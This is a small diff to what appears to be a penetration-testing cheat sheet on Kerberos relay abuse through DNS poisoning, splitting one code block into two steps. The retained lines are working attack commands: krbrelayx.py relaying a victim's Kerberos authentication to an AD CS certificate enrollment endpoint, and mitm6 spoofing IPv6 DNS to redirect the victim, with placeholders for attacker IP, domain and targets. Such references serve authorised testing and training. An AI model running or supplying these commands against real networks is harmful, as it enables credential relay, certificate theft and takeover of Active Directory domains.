@@ -4,10 +4,10 @@
 
 ## Kerberos relay - Abuse from DNS poisoning
 ```sh
-# In a first terminal, waiting for an authentication to relay
 krbrelayx.py --target http://<ADCS_FQDN>/certsrv/ -ip <ATTACKER_IP> --victim <TARGET_SAMNAME> --adcs --template <Machine>
-
-# In a second terminal, poisoning the victim
+```
+## Kerberos relay - Abuse from DNS poisoning step 2
+```
 mitm6 -i <ATTACKER_IP> -d <DOMAIN> -hw <TARGET_FQDN> --relay <ADCS_FQDN> -v
 ```
 
